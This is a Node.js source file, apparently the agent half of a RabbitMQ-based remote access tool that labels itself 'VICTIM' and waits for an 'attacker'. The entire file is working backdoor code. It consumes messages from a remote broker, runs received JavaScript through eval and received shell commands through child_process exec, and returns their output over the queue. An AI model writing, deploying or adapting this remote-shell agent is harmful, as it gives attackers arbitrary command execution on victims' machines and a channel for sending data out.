import { connect } from 'amqplib'
import { exec } from 'child_process'
import { Logger } from '@secjs/logger'
import { toObject } from './utils/toObject.mjs'
import { toBuffer } from './utils/toBuffer.mjs'
import { QUEUE, CONNECTION_URL } from './utils/constants.mjs'

const logger = new Logger('VICTIM')

const codeHandler = (value, channel) => {
    logger.log(`Executing code inside eval -> ${value}`)

    const fn = `try {
        const valueAsFunc = () => {
            return ${value}
        }
        
        channel.sendToQueue(QUEUE, toBuffer({ type: 'stdout', value: valueAsFunc(), isFromVictim: true }))
    } catch(error) {
        channel.sendToQueue(QUEUE, toBuffer({ type: 'error', value: { name: error.message, stack: error.stack }, isFromVictim: true }))
    }`

    eval(fn)
}

const commandHandler = (value, channel) => {
    logger.log(`Executing command inside child process -> ${value}`)

    exec(value, (error, stdout, stderr) => {
        if (error) channel.sendToQueue(QUEUE, toBuffer({ type: 'error', value: error, isFromVictim: true }))
        if (stderr) channel.sendToQueue(QUEUE, toBuffer({ type: 'stderr', value: stderr, isFromVictim: true }))
        if (stdout) channel.sendToQueue(QUEUE, toBuffer({ type: 'stdout', value: stdout, isFromVictim: true }))
    })
}

(async () => {
    const connection = await connect(CONNECTION_URL)
    const channel = await connection.createChannel()

    logger.log(`Awaiting attacker in queue -> ${QUEUE}.`)

    channel.consume(QUEUE, (msg) => {
        if (!msg) logger.log('Message is null.')

        const data = toObject(msg)

        if (data.isFromVictim) return channel.nack(msg)

        if (data.type === 'code') codeHandler(data.value, channel)
        if (data.type === 'command') commandHandler(data.value, channel)

        channel.ack(msg)
    })
})();
